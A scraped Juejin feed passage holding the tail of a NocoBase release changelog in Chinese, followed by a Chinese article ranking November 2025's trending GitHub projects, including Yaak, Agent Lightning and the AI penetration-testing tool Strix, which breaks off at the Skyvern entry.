<li><strong>[数据表：树]</strong> 修复因树表父字段获取不正确导致路径表更新失败的问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8000" target="_blank" title="https://github.com/nocobase/nocobase/pull/8000" ref="nofollow noopener noreferrer">#8000</a>) by @2013xile</li>
<li><strong>[数据表字段：多对多 (数组)]</strong> 修复子表格中多对多数组关系字段数据无法更新问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F7998" target="_blank" title="https://github.com/nocobase/nocobase/pull/7998" ref="nofollow noopener noreferrer">#7998</a>) by @cgyrock</li>
<li><strong>[部门]</strong> 修复部门插件中的部门用户关联字段无法编辑的问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F7462" target="_blank" title="https://github.com/nocobase/nocobase/pull/7462" ref="nofollow noopener noreferrer">#7462</a>) by @heziqiang</li>
<li><strong>[工作流：审批]</strong> 修复由于 <code>RemoteSelect</code> 组件变更导致的加载 <code>approvalRecords.reassignee</code> 资源的权限问题 by @mytharcher</li>
</ul>
<h3 data-id="heading-21"><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Fv2.0.0-alpha.48" target="_blank" title="https://www.nocobase.com/cn/blog/v2.0.0-alpha.48" ref="nofollow noopener noreferrer">v2.0.0-alpha.48</a></h3>
<p><em>发布时间：2025-11-28</em></p>
<h3 data-id="heading-22">🎉 新特性</h3>
<ul>
<li><strong>[区块：地图]</strong> 新增 2.0 地图区块 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F7944" target="_blank" title="https://github.com/nocobase/nocobase/pull/7944" ref="nofollow noopener noreferrer">#7944</a>) by @katherinehhh</li>
<li><strong>[认证：OIDC]</strong> 支持选项 当用户未登录时自动跳转到 SSO 登录页 by @heziqiang</li>
</ul>
<h3 data-id="heading-23">🐛 修复</h3>
<ul>
<li>
<p><strong>[client]</strong></p>
<ul>
<li>避免打开字段默认值配置时的报错 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F7997" target="_blank" title="https://github.com/nocobase/nocobase/pull/7997" ref="nofollow noopener noreferrer">#7997</a>) by @mytharcher</li>
<li>修复关系树表表格区块添加子记录时报错的问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F7989" target="_blank" title="https://github.com/nocobase/nocobase/pull/7989" ref="nofollow noopener noreferrer">#7989</a>) by @katherinehhh</li>
<li>修复 markdown 字段 HTML 模式下超出宽度省略时显示异常的问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F7994" target="_blank" title="https://github.com/nocobase/nocobase/pull/7994" ref="nofollow noopener noreferrer">#7994</a>) by @katherinehhh</li>
<li>修复级联下拉选择器搜索数据不全问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F7990" target="_blank" title="https://github.com/nocobase/nocobase/pull/7990" ref="nofollow noopener noreferrer">#7990</a>) by @katherinehhh</li>
<li>修复跳转页面时页面 tab 的状态和路由不对应的问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F7991" target="_blank" title="https://github.com/nocobase/nocobase/pull/7991" ref="nofollow noopener noreferrer">#7991</a>) by @zhangzhonghe</li>
<li>修复 下拉列表组件在非对象值回显时没有正确显示label 问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F7975" target="_blank" title="https://github.com/nocobase/nocobase/pull/7975" ref="nofollow noopener noreferrer">#7975</a>) by @katherinehhh</li>
</ul>
</li>
<li>
<p><strong>[database]</strong> 修复：移除 time 字段转换中的 UTC 处理，避免因时区导致的纯时间值偏移 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F7812" target="_blank" title="https://github.com/nocobase/nocobase/pull/7812" ref="nofollow noopener noreferrer">#7812</a>) by @ChimingLiu</p>
</li>
<li>
<p><strong>[工作流]</strong></p>
<ul>
<li>修复停止服务前，已创建的执行计划未发送到队列的问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F7981" target="_blank" title="https://github.com/nocobase/nocobase/pull/7981" ref="nofollow noopener noreferrer">#7981</a>) by @mytharcher</li>
<li>修复部分工作流待办菜单不显示的问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F7980" target="_blank" title="https://github.com/nocobase/nocobase/pull/7980" ref="nofollow noopener noreferrer">#7980</a>) by @mytharcher</li>
<li>修复点击默认进入的待办列表中的任务跳转到错误页面的问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F7983" target="_blank" title="https://github.com/nocobase/nocobase/pull/7983" ref="nofollow noopener noreferrer">#7983</a>) by @mytharcher</li>
</ul>
</li>
<li>
<p><strong>[数据可视化]</strong> 外部数据源表的筛选字段的配置项不能显示特有属性 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F7982" target="_blank" title="https://github.com/nocobase/nocobase/pull/7982" ref="nofollow noopener noreferrer">#7982</a>) by @2013xile</p>
</li>
<li>
<p><strong>[数据源管理]</strong> 修复外部数据源修改密码后系统内无法更新密码的问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F7977" target="_blank" title="https://github.com/nocobase/nocobase/pull/7977" ref="nofollow noopener noreferrer">#7977</a>) by @cgyrock</p>
</li>
<li>
<p><strong>[操作：导入记录]</strong> 修复树表导入数据报错问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F7976" target="_blank" title="https://github.com/nocobase/nocobase/pull/7976" ref="nofollow noopener noreferrer">#7976</a>) by @cgyrock</p>
</li>
<li>
<p><strong>[工作流：人工处理节点]</strong> 修复人工待办任务统计数字不对的问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F7984" target="_blank" title="https://github.com/nocobase/nocobase/pull/7984" ref="nofollow noopener noreferrer">#7984</a>) by @mytharcher</p>
</li>
<li>
<p><strong>[工作流：审批]</strong></p>
<ul>
<li>修复用户在撤回重新提交后，工作流上下文中缺少申请人数据的问题 by @mytharcher</li>
<li>修复用户带评论提交审批后在节点结果中评论为空的问题 by @mytharcher</li>
</ul>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🚀 2025 年 11 月 GitHub 十大热门项目排行榜 🔥]]></title>    <link>https://juejin.cn/post/7579889969986502707</link>    <guid>https://juejin.cn/post/7579889969986502707</guid>    <pubDate>2025-12-05T04:18:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579889969986502707" data-draft-id="7579889969986306099" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="🚀 2025 年 11 月 GitHub 十大热门项目排行榜 🔥"/> <meta itemprop="keywords" content="前端,GitHub,人工智能"/> <meta itemprop="datePublished" content="2025-12-05T04:18:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一点一木"/> <meta itemprop="url" content="https://juejin.cn/user/1063982986187486"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            🚀 2025 年 11 月 GitHub 十大热门项目排行榜 🔥
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1063982986187486/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一点一木
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T04:18:54.000Z" title="Fri Dec 05 2025 04:18:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>欢迎来到 2025 年 11 月 <code>GitHub</code> 热门开源项目排行榜！本期榜单横跨<strong>本地化生产力工具</strong>、<strong><code>AI Agent</code> 可训练化</strong>、<strong>自动化安全测试</strong>、<strong>舆情智能分析</strong>、<strong>跨平台硬件解放</strong>、<strong>浏览器 <code>AI</code> 自动化</strong>、<strong>私有化 <code>CRM</code><strong>等前沿领域。这十个项目代表了当下最火热的三大趋势：</strong><code>Agent</code> 从“能用”到“可训练”</strong> 、<strong>隐私与本地优先全面回归</strong>、<strong><code>AI</code> 原生自动化席卷一切重复性工作</strong>。它们正推动开源从实验玩具快速迈向生产级刚需。</p>
<ol>
<li>
<h3 data-id="heading-0"><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmountain-loop%2Fyaak" target="_blank" title="https://github.com/mountain-loop/yaak" ref="nofollow noopener noreferrer"><code>Yaak</code></a></h3>
<p>🌟 <strong><code>Star</code> 数：<code>16.7K+</code></strong></p>
<p><strong>📦 一款隐私优先、跨平台的桌面 <code>API</code> 客户端</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/00e0722d6ecc483c8939bda5dce58698~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765513134&amp;x-signature=JbjLPr%2Ba5UYd2N2HbcbOaDZlI1E%3D" alt="Yaak.png" loading="lazy"/></p>
<p><strong><code>Yaak</code></strong> 是专为开发者打造的完全本地化 <code>API</code> 客户端，支持 <code>REST / GraphQL / WebSocket / SSE / gRPC</code> 全协议栈。基于 <code>Tauri + Rust + React</code> 构建，轻量极速、无遥测、无云依赖，彻底取代 <code>Postman</code> 与 <code>Insomnia</code>。</p>
<ul>
<li><strong>多协议 &amp; 一站式</strong>：一个工具搞定所有 <code>API</code> 调试场景</li>
<li><strong>导入兼容强</strong>：完美支持 <code>Postman / Insomnia / OpenAPI / Swagger / cURL</code> 一键迁移</li>
<li><strong>隐私 + 本地优先</strong>：所有请求、密钥、环境变量永不上云，无需账号</li>
<li><strong>版本控制友好</strong>：<code>Collections</code> 直接映射为文件夹，天然适配 <code>Git</code> 管理</li>
<li><strong>轻量跨平台</strong>：<code>macOS / Windows / Linux</code> 统一体验，启动秒开</li>
</ul>
<p>💡 <strong><code>Yaak</code></strong> 适合极度重视隐私与数据安全的前后端开发者、多协议 <code>API</code> 重度用户、希望用 <code>Git</code> 管理接口文档的团队。</p>
<p>👉 <strong>立即体验</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmountain-loop%2Fyaak" target="_blank" title="https://github.com/mountain-loop/yaak" ref="nofollow noopener noreferrer"><code>GitHub</code></a></p>
</li>
<li>
<h3 data-id="heading-1"><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmicrosoft%2Fagent-lightning" target="_blank" title="https://github.com/microsoft/agent-lightning" ref="nofollow noopener noreferrer"><code>Agent Lightning</code></a></h3>
<p>🌟 <strong><code>Star</code> 数：<code>9.4K+</code></strong></p>
<p><strong>⚡ 微软研究院开源：让任何 <code>AI Agent</code> 一键可训练、可进化</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/74e752f2156a46b4b35dd525c77fa88e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765513134&amp;x-signature=BYnZdfEnj4fzJdkmsSpBLdblGI8%3D" alt="agent-lightning.png" loading="lazy"/></p>
<p><strong><code>Agent Lightning</code></strong> 让现有 <code>Agent</code>（<code>LangChain</code>、<code>AutoGen</code>、<code>CrewAI</code>、甚至手写 <code>Agent</code>）几乎不改代码即可接入强化学习、提示优化、微调等训练闭环。</p>
<ul>
<li><strong>兼容任意框架</strong>：不挑框架、不挑实现方式</li>
<li><strong>零侵入接入</strong>：几行 <code>tracer</code> 即可收集训练数据</li>
<li><strong>支持复杂场景</strong>：多 <code>Agent</code>、长交互、工具调用全覆盖训练</li>
<li><strong>多种优化手段</strong>：<code>RL</code> / 自动提示优化 / 监督微调全都有</li>
<li><strong>动态闭环训练</strong>：<code>Agent</code> 执行时自动生成可学习数据并迭代</li>
</ul>
<p>💡 <strong><code>Agent Lightning</code></strong> 适合想把 <code>Agent</code> 从“能跑”进化到“会学”的 <code>AI</code> 工程师、研究者及多代理系统开发者。</p>
<p>👉 <strong>立即探索</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmicrosoft%2Fagent-lightning" target="_blank" title="https://github.com/microsoft/agent-lightning" ref="nofollow noopener noreferrer"><code>GitHub</code></a></p>
</li>
<li>
<h3 data-id="heading-2"><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fusestrix%2Fstrix" target="_blank" title="https://github.com/usestrix/strix" ref="nofollow noopener noreferrer"><code>Strix</code></a></h3>
<p>🌟 <strong><code>Star</code> 数：<code>16.5K+</code></strong></p>
<p><strong>🔐 <code>AI</code> 驱动的自动化渗透测试与漏洞验证平台</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1e74f34eb65a40ec8c8b7b882421fb03~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765513134&amp;x-signature=QVv30lmn6rbioVWxrJKrBZz3%2Fto%3D" alt="Strix.png" loading="lazy"/></p>
<p><strong><code>Strix</code></strong> 通过 <code>AI</code> 黑客代理模拟真实攻击者，自动发现、验证漏洞并生成 <code>PoC</code> 与修复报告，假阳性极低，可直接嵌入 <code>CI/CD</code>。</p>
<ul>
<li><strong>真实 <code>Exploit</code> 执行</strong>：不仅扫描，还真正跑攻击链验证漏洞</li>
<li><strong>完整工具链</strong>：浏览器自动化、代码执行环境、<code>HTTP</code> 代理全内置</li>
<li><strong>自动生成 <code>PoC</code></strong> + 可操作修复建议报告</li>
<li><strong>天生适配 <code>DevSecOps</code></strong>：支持 <code>GitHub Actions</code> 一键集成</li>
</ul>
<p>💡 <strong><code>Strix</code></strong> 适合安全团队、<code>DevSecOps</code> 工程师、想在部署前自动拦截漏洞的后端开发者。</p>
<p>👉 <strong>立即体验</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fusestrix%2Fstrix" target="_blank" title="https://github.com/usestrix/strix" ref="nofollow noopener noreferrer"><code>GitHub</code></a></p>
</li>
<li>
<h3 data-id="heading-3"><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsansan0%2FTrendRadar" target="_blank" title="https://github.com/sansan0/TrendRadar" ref="nofollow noopener noreferrer"><code>TrendRadar</code></a></h3>
<p>🌟 <strong><code>Star</code> 数：<code>37.8K+</code></strong></p>
<p><strong>📡 多平台热点聚合 + <code>AI</code> 驱动舆情/趋势分析工具</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a06578e2e504572b85c36356a043c30~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765513134&amp;x-signature=9a6WPUeTMVt%2FGBFQUiO9m3dwdZo%3D" alt="TrendRadar.png" loading="lazy"/></p>
<p><strong><code>TrendRadar</code></strong> 实时抓取 35+ 平台热点，通过 <code>AI</code> 分析热度变化、生命周期、跨平台传播，支持自定义关键词与多种推送方式。</p>
<ul>
<li><strong>多平台热点聚合</strong>：抖音、微博、小红书、知乎等 35+ 源</li>
<li><strong>智能筛选 + 趋势分析</strong>：热度曲线、生命周期、持续性全维度</li>
<li><strong>多种推送方式</strong>：<code>Telegram</code> / 企业微信 / 飞书 / 钉钉 / <code>Email</code> 全支持</li>
<li><strong>快速部署</strong>：<code>Docker</code> 一键启动，无需编程基础</li>
</ul>
<p>💡 <strong><code>TrendRadar</code></strong> 适合内容创作者、投资人、公关团队、舆情分析师以及任何想提炼有效信息信号的用户。</p>
<p>👉 <strong>立即探索</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsansan0%2FTrendRadar" target="_blank" title="https://github.com/sansan0/TrendRadar" ref="nofollow noopener noreferrer"><code>GitHub</code></a></p>
</li>
<li>
<h3 data-id="heading-4"><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkavishdevar%2Flibrepods" target="_blank" title="https://github.com/kavishdevar/librepods" ref="nofollow noopener noreferrer"><code>LibrePods</code></a></h3>
<p>🌟 <strong><code>Star</code> 数：<code>19.1K+</code></strong></p>
<p><strong>🎧 让 <code>AirPods</code> 在 <code>Android / Linux</code> 上解锁完整功能</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b4b7bf0306c746e5b09341addd7581b7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765513134&amp;x-signature=WkkhF9un1PeQXwjaCW87Ht6%2B%2FnE%3D" alt="librepods-banner.png" loading="lazy"/></p>
<p><strong><code>LibrePods</code></strong> 通过逆向与模块化实现，让非苹果设备用户用上 <code>ANC</code>、通透、入耳检测、头部手势、对话感知等全部高端功能。</p>
<ul>
<li><strong>完整功能还原</strong>：<code>ANC</code>、通透、自适应、头部手势全支持</li>
<li><strong>多设备自动切换</strong>：与苹果生态无缝衔接</li>
<li><strong>支持听觉辅助</strong>与个性化音效定制</li>
<li><strong>适配双平台</strong>：<code>Android</code>（<code>Root</code>）与 <code>Linux</code>（模块）两种方案</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d928e349de2143b8b590c580e97fb3b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765513134&amp;x-signature=3LAUKO9cwsFGGVTyPJt9baCv%2F48%3D" alt="librepods-linux.png" loading="lazy"/></p>
<p>💡 <strong><code>LibrePods</code></strong> 适合拥有 <code>AirPods</code> 但使用 <code>Android/Linux</code> 的用户，尤其是想体验完整降噪与空间音频的折腾党。</p>
<p>👉 <strong>立即探索</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkavishdevar%2Flibrepods" target="_blank" title="https://github.com/kavishdevar/librepods" ref="nofollow noopener noreferrer"><code>GitHub</code></a></p>
</li>
<li>
<h3 data-id="heading-5"><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2F666ghj%2FBettaFish" target="_blank" title="https://github.com/666ghj/BettaFish" ref="nofollow noopener noreferrer"><code>BettaFish</code></a></h3>
<p>🌟 <strong><code>Star</code> 数：<code>30.9K+</code></strong></p>
<p><strong>🤖 多智能体驱动的全自动舆情分析与报告生成系统</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58abfb62b0924ff58f50b298cdcfad02~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765513134&amp;x-signature=vRA2WhhX8FDwwmxH1TXZGR%2BYTZg%3D" alt="BettaFish_system_schematic.png" loading="lazy"/></p>
<p><strong><code>BettaFish</code></strong> 用多个协作 <code>Agent</code> 完成全网抓取 → 多模态分析 → 自动生成带图表的专业舆情报告。</p>
<ul>
<li><strong>多 <code>Agent</code> 协作</strong>：搜索、内容理解、数据库挖掘、报告生成各司其职</li>
<li><strong>多来源 &amp; 多模态</strong>：支持新闻、社交媒体、视频、评论全覆盖</li>
<li><strong>自动报告生成</strong>：包含趋势分析、观点总结、情感结构、可视化图表</li>
<li><strong>一键部署</strong>：<code>Docker</code> 开箱即用，可深度定制</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dcadb1e7836a43c2a7d70df0fe64adfa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765513134&amp;x-signature=IN%2BHK1Gs%2Bfs%2FIUyuShX1jQcmTVs%3D" alt="BettaFish_framework.png" loading="lazy"/></p>
<p>💡 <strong><code>BettaFish</code></strong> 适合品牌公关、市场研究、媒体监测团队，以及需要快速生成决策级舆情报告的组织。</p>
<p>👉 <strong>立即探索</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2F666ghj%2FBettaFish" target="_blank" title="https://github.com/666ghj/BettaFish" ref="nofollow noopener noreferrer"><code>GitHub</code></a></p>
</li>
<li>
<h3 data-id="heading-6"><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fourongxing%2Fnewsnow" target="_blank" title="https://github.com/ourongxing/newsnow" ref="nofollow noopener noreferrer"><code>NewsNow</code></a></h3>
<p>🌟 <strong><code>Star</code> 数：<code>14.9K+</code></strong></p>
<p><strong>📡 优雅、实时、多源新闻聚合与阅读平台</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f0ec4db1b64444f9ae35c8d04f8d9c82~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765513134&amp;x-signature=7BkQFikHFXyBm94P616vSzXL9GM%3D" alt="NewsNow.png" loading="lazy"/></p>
<p><strong><code>NewsNow</code></strong> 从 40+ 新闻源与社交媒体抓取实时内容，以极简清爽界面呈现，支持自建与跨设备同步。</p>
<ul>
<li><strong>多源实时聚合</strong>：覆盖国内外主流媒体与社交平台</li>
<li><strong>极简阅读体验</strong>：界面美观，专注内容本身</li>
<li><strong>智能缓存机制</strong>：默认 30 分钟缓存，最快 2 分钟刷新</li>
<li><strong>多方式部署</strong>：支持 <code>Docker</code>、<code>Vercel</code>、<code>Cloudflare Pages</code></li>
</ul>
<p>💡 <strong><code>NewsNow</code></strong> 适合资讯重度用户、内容创作者、研究者，以及想自建私人新闻中心的开发者。</p>
<p>👉 <strong>立即体验</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fourongxing%2Fnewsnow" target="_blank" title="https://github.com/ourongxing/newsnow" ref="nofollow noopener noreferrer"><code>GitHub</code></a></p>
</li>
<li>
<h3 data-id="heading-7"><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FSkyvern-AI%2Fskyvern" target="_blank" title="https://github.com/Skyvern-AI/skyvern" ref="nofollow noopener noreferrer"><code>Skyvern</code></a></h3>
<p>🌟 <strong><code>Star</code> 数：<code>19.4K+</code></strong></p>
